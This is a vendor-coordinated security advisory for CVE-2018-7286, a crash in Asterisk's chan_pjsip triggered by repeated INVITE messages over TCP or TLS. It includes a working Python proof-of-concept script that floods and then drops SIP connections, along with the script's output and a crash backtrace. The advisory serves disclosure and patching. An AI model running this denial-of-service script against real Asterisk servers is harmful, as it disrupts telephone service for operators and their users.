# Crash occurs when sending a repeated number of INVITE messages over TCP or TLS transport

- Authors:
    - Alfred Farrugia <alfred@enablesecurity.com>
    - Sandro Gauci <sandro@enablesecurity.com>
- Latest vulnerable version: Asterisk 15.2.0 running `chan_pjsip` installed with `--with-pjproject-bundled`
- References: AST-2018-005, CVE-2018-7286
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-04-asterisk-pjsip-tcp-segfault>
- Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2018-005.html>
- Tested vulnerable versions: 15.2.0, 15.1.0, 15.0.0, 13.19.0, 13.11.2, 14.7.5
- Timeline:
    - Issue reported to vendor: 2018-01-24
    - Vendor patch made available to us: 2018-02-05
    - Vendor advisory published: 2018-02-21
    - Enable Security advisory: 2018-02-22

## Description

A crash occurs when a number of INVITE messages are sent over TCP or TLS and
then the connection is suddenly closed. This issue leads to a segmentation fault. 

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when
`chan_pjsip` is in use.

## How to reproduce the issue

The following script was used to reproduce the issue on a TLS connection:

```python
import md5
import re
import socket
import ssl
import uuid
from time import sleep

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5061
USERNAME = "3000"
PASSWORD = "3000"
INVITE_USERNAME = "3000"

errno = 0
lasterrno = 0
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock = ssl.wrap_socket(sock,
                               ssl_version=ssl.PROTOCOL_TLSv1,
                               )

        sock.connect((SERVER_IP, SERVER_PORT))
        sock.settimeout(0.5)
        errno = 0
        callid = str(uuid.uuid4())
        for ix in range(10):
            sdpbody = ""

            msg = "INVITE sip:%s@%s:%i SIP/2.0\r\n" \
                "To: <sip:%s@%s:%i>\r\n" \
                "From: Test <sip:%s@%s:%s>\r\n" \
                "Call-ID: %s\r\n" \
                "CSeq: 2 INVITE\r\n" \
                "Via: SIP/2.0/TLS 172.17.0.1:10394;branch=z9hG4bK%s\r\n" \
                "Contact: <sip:%s@172.17.0.1>\r\n" \
                "Content-Type: application/sdp\r\n" \
                "{{AUTH}}" \
                "Content-Length: %i\r\n" \
                "\r\n" % (
                    INVITE_USERNAME, SERVER_IP, SERVER_PORT,
                    INVITE_USERNAME, SERVER_IP, SERVER_PORT,
                    USERNAME, SERVER_IP, SERVER_PORT,
                    callid, callid,
                    USERNAME, len(sdpbody)
                ) + \
                sdpbody

            sock.sendall(msg.replace("{{AUTH}}", ""))

            data = sock.recv(10240)
            # print(data)
            if data.startswith("SIP/2.0 401"):
                for line in data.split('\r\n'):
                    if line.startswith("WWW-Authenticate"):
                        content = line.split(':', 2)[1].strip()
                        realm = re.search(
                            "realm=\"([a-z]+)\"", content).group(1)
                        nonce = re.search(
                            "nonce=\"([a-z0-9\/]+)\"", content).group(1)
                        ha1 = md5.new(USERNAME + ":" + realm +
                                      ":" + PASSWORD).hexdigest()
                        uri = "sip:%s:%i" % (SERVER_IP, SERVER_PORT)
                        ha2 = md5.new("INVITE:" + uri).hexdigest()
                        r = md5.new(ha1 + ":" + nonce + ":" + ha2).hexdigest()

                        auth = "Authorization: Digest username=\"%s\"," % (USERNAME) + \
                            "realm=\"%s\"," % (realm) + \
                            "nonce=\"%s\"," % (nonce) + \
                            "uri=\"%s\"," % (uri) + \
                            "response=\"%s\"," % (r) + \
                            "algorithm=md5\r\n"
                        print(auth)

            sock.sendall(msg.replace("{{AUTH}}", auth))
            errno = 0
    except (socket.error, ssl.SSLEOFError), err:
        print(err)
        print("getting close!")
        sleep(2)
        errno += 1
    if errno >= 10:
        print("confirmed dead")
        break
    elif errno > lasterrno:
        lasterrno = errno
        continue
```

The output from the tool should show the following:

```
> python test.py
Authorization: Digest username="3000",realm="asterisk",nonce="1516728889/07e2e34fbd45ed7f6b1bca0d2bde50ae",uri="sip:127.0.0.1:5061",response="a2b7e2bfa722730b64787664db474f2a",algorithm=md5

EOF occurred in violation of protocol (_ssl.c:590)
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
[Errno 111] Connection refused
getting close!
confirmed dead
```

Notes:

- authentication may be required
- the destination SIP address should match a valid extension in the dialplan
- similar code to the above can be used to reproduce the issue on TCP transport


### GDB backtrace result

```
gdb --args /opt/asterisk/sbin/asterisk -fcvvv

Thread 25 "asterisk" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff030a700 (LWP 133)]
ast_sip_failover_request (tdata=0x0) at res_pjsip.c:3956
3956            if (!tdata->dest_info.addr.count || (tdata->dest_info.cur_addr == tdata->dest_info.addr.count - 1)) {
(gdb) bt
#0  ast_sip_failover_request (tdata=0x0) at res_pjsip.c:3956
#1  0x00007ffff1a8dbb1 in check_request_status (inv=inv@entry=0x7fff9910bac8, e=0x7ffff0308ae0) at res_pjsip_session.c:3371
#2  0x00007ffff1a8dc83 in session_inv_on_state_changed (inv=0x7fff9910bac8, e=0x7ffff0308ae0) at res_pjsip_session.c:3455
#3  0x00007ffff7848217 in inv_set_state (state=PJSIP_INV_STATE_DISCONNECTED, e=0x7ffff0308ae0, inv=0x7fff9910bac8) at ../src/pjsip-ua/sip_inv.c:317
#4  inv_on_state_null (inv=0x7fff9910bac8, e=0x7ffff0308ae0) at ../src/pjsip-ua/sip_inv.c:3890
#5  0x00007ffff7841a77 in mod_inv_on_tsx_state (tsx=0x7fff99116408, e=0x7ffff0308ae0) at ../src/pjsip-ua/sip_inv.c:717
#6  0x00007ffff788299d in pjsip_dlg_on_tsx_state (dlg=0x7fff990eccc8, tsx=0x7fff99116408, e=0x7ffff0308ae0) at ../src/pjsip/sip_dialog.c:2066
#7  0x00007ffff787b513 in tsx_set_state (tsx=0x7fff99116408, state=PJSIP_TSX_STATE_TERMINATED, event_src_type=PJSIP_EVENT_TRANSPORT_ERROR, event_src=0x7fff9910fda8, flag=0)
    at ../src/pjsip/sip_transaction.c:1267
#8  0x00007ffff787cfec in send_msg_callback (send_state=0x7fff9918d2f0, sent=-171064, cont=0x7ffff0308c04) at ../src/pjsip/sip_transaction.c:1970
#9  0x00007ffff78661ae in send_response_resolver_cb (status=<optimized out>, token=0x7fff9918d2f0, addr=0x7ffff0308c60) at ../src/pjsip/sip_util.c:1721
#10 0x00007ffff184df8c in sip_resolve (resolver=<optimized out>, pool=<optimized out>, target=0x7fff99116530, token=0x7fff9918d2f0, cb=0x7ffff78660f0 <send_response_resolver_cb>)
    at res_pjsip/pjsip_resolver.c:527
#11 0x00007ffff7869adb in pjsip_resolve (resolver=0x1b64d40, pool=<optimized out>, target=target@entry=0x7fff99116530, token=token@entry=0x7fff9918d2f0,
    cb=cb@entry=0x7ffff78660f0 <send_response_resolver_cb>) at ../src/pjsip/sip_resolve.c:209
#12 0x00007ffff78652b9 in pjsip_endpt_resolve (endpt=endpt@entry=0x1638d28, pool=<optimized out>, target=target@entry=0x7fff99116530, token=token@entry=0x7fff9918d2f0,
    cb=cb@entry=0x7ffff78660f0 <send_response_resolver_cb>) at ../src/pjsip/sip_endpoint.c:1164
#13 0x00007ffff7867fe1 in pjsip_endpt_send_response (endpt=0x1638d28, res_addr=res_addr@entry=0x7fff99116508, tdata=tdata@entry=0x7fff9910fda8, token=token@entry=0x7fff99116408,
    cb=cb@entry=0x7ffff787cd80 <send_msg_callback>) at ../src/pjsip/sip_util.c:1796
#14 0x00007ffff787bdac in tsx_send_msg (tsx=0x7fff99116408, tdata=0x7fff9910fda8) at ../src/pjsip/sip_transaction.c:2237
#15 0x00007ffff787dc67 in tsx_on_state_proceeding_uas (event=0x7ffff0309b30, tsx=0x7fff99116408) at ../src/pjsip/sip_transaction.c:2704
#16 tsx_on_state_trying (tsx=0x7fff99116408, event=0x7ffff0309b30) at ../src/pjsip/sip_transaction.c:2634
#17 0x00007ffff787fba7 in pjsip_tsx_send_msg (tsx=tsx@entry=0x7fff99116408, tdata=tdata@entry=0x7fff9910fda8) at ../src/pjsip/sip_transaction.c:1789
#18 0x00007ffff78822a3 in pjsip_dlg_send_response (dlg=0x7fff990eccc8, tsx=0x7fff99116408, tdata=tdata@entry=0x7fff9910fda8) at ../src/pjsip/sip_dialog.c:1531
#19 0x00007ffff784519a in pjsip_inv_send_msg (inv=0x7fff9910bac8, tdata=0x7fff9910fda8) at ../src/pjsip-ua/sip_inv.c:3231
#20 0x00007ffff1a8c043 in ast_sip_session_send_response (session=session@entry=0x7fff9910e208, tdata=<optimized out>) at res_pjsip_session.c:1712
#21 0x00007ffff1a8ec09 in new_invite (invite=<synthetic pointer>) at res_pjsip_session.c:2963
#22 handle_new_invite_request (rdata=0x7fff9524ce58) at res_pjsip_session.c:3062
#23 session_on_rx_request (rdata=0x7fff9524ce58) at res_pjsip_session.c:3126
#24 0x00007ffff7864e97 in pjsip_endpt_process_rx_data (endpt=<optimized out>, rdata=rdata@entry=0x7fff9524ce58, p=p@entry=0x7ffff1a7ed00 <param>,
    p_handled=p_handled@entry=0x7ffff0309d44) at ../src/pjsip/sip_endpoint.c:893
#25 0x00007ffff185427f in distribute (data=0x7fff9524ce58) at res_pjsip/pjsip_distributor.c:903
#26 0x00000000005fc6fe in ast_taskprocessor_execute (tps=tps@entry=0x1cf2b08) at taskprocessor.c:963
#27 0x0000000000603960 in execute_tasks (data=0x1cf2b08) at threadpool.c:1322
#28 0x00000000005fc6fe in ast_taskprocessor_execute (tps=0x16343d8) at taskprocessor.c:963
#29 0x0000000000603e40 in threadpool_execute (pool=0x1637b78) at threadpool.c:351
#30 worker_active (worker=0x7fffa0000948) at threadpool.c:1105
#31 worker_start (arg=arg@entry=0x7fffa0000948) at threadpool.c:1024
#32 0x000000000060eddd in dummy_start (data=<optimized out>) at utils.c:1257
#33 0x00007ffff5e366ba in start_thread (arg=0x7ffff030a700) at pthread_create.c:333
#34 0x00007ffff541f3dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
(gdb)
```

## Solutions and recommendations

Apply the patch issued by Asterisk at <http://www.asterisk.org/security> or upgrade to the latest release.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
